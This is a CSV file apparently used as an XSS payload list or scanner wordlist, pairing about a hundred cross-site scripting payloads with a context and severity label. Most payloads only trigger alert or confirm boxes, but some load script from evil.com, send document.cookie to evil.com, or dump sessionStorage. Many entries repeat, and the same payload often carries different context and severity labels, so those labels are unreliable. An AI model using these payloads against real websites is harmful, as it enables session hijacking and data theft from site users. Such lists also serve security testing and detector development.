payload,context,severity
"""><img src=x onerror=alert(document.cookie));>",html_body,high
\x3csvg onload=alert(1)\x3e,event_handler,medium
"location
=""javascript:alert(	1)""",dom_sink,low
javascript:confirm(1),js_uri,low
"<svg onload=""confirm(7)"">",html_body,medium
"<img/src
=x onerror
=alert(	1)//>",tag_injection,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"onload=""confirm(1)""",html_body,medium
onload='alert(1)',html_body,medium
' onerror=alert(1) x=',attribute,high
<img/src/onerror=alert(1),html_body,medium
.alert(1);,html_body,medium
prompt(9),html_body,medium
"""><svg
 onload=alert()>",html_body,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<svg/onload=alert(1)>,tag_injection,medium
alert(2),html_body,medium
<script>confirm(document.domain)</script>,script_injection,low
onerror=alert(0);>,html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
j\u0061v\u0061script:\u0061\u006cert(1),attribute_escape,medium
<script src=//evil.com/xss.js></script>,template_injection,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
onerror=alert(0);>,html_body,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
<script src=//evil.com/xss.js></script>,script_injection,medium
<svg onload=alert()>,attribute,medium
<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT>,script_injection,low
<%= confirm(1) %>,event_handler,low
' onmouseover=alert(1) ',attribute,high
"<object data=""javascr/**/ipt:alert(1)"">",tag_injection,medium
""" onfocus=alert(1) autofocus=""",js_uri,medium
<%= alert(1) %>,attribute_escape,low
<svg////////onload=alert(1)>,html_body,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,high
<img src/onerror=alert(1)>,html_body,medium
prompt(9),html_body,medium
<script>alert(1)</script>,script_injection,low
"""><svg onload=alert()>",html_body,medium
<svg onload=alert(1)>,tag_injection,medium
javascript:alert(document.domain),js_uri,medium
onload='alert(1)',html_body,medium
"data:text/html,<script>alert(1)</script>",attribute,high
%3Cimg src=x onerror=alert(1)%3E,tag_injection,medium
"\"" onerror=\u0061\u006cert(1)//",attribute,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",attribute,high
"location=""javaSCRIPT:alert(1)""",tag_injection,medium
‘; alert(1);,html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
<img src/onerror=prompt(8)>,html_body,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,low
"<svG/x="">""/onfocus=confirm()//",attribute,medium
<select ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
confirm(1))</SCRIPT>,html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,js_block,high
""" onload=alert(1) x=""",attribute,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
"setTimeout(""alert(1)"",0)",dom_sink,low
-alert(1)-',html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
"<iframe src=""javascript:alert(1)"">",attribute_escape,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
location='javaScriPt:alert\x2845\x29',js_block,high
<img src/onerror=prompt(8)>,html_body,medium
<audio src/onerror=alert(1)>,html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>""",dom_sink,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
<script src=//evil.com/xss.js></script>,script_injection,low
javascript:alert(1),attribute_escape,low
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"<svg onload=""confirm(7)"">",html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
<svg><a onload=alert(1)></a>,html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
innerHTML=location.hash>#<script>self.alert(1)</script>,html_body,high
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",attribute,high
<iframe/onload=alert(0);>,attribute,medium
"setTimeout(	""alert(	1)"",0)",dom_sink,high
"\"" onerror=alert(1)//",js_uri,high
"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute,low
%20javascript:alert(1),url,medium
"\"" onerror=alert(1)//",attribute_escape,high
{{7*7}},script_injection,low
<%= aLeRt(1) %>,script_injection,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,low
<script>alert(document.domain)</script>,script_injection,medium
onerror='alert(1)',html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"<iframe src=""javascript:alert(1)"">",event_handler,medium
;alert(1);,html_body,medium
<marquee onstart=al'+'ert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,high
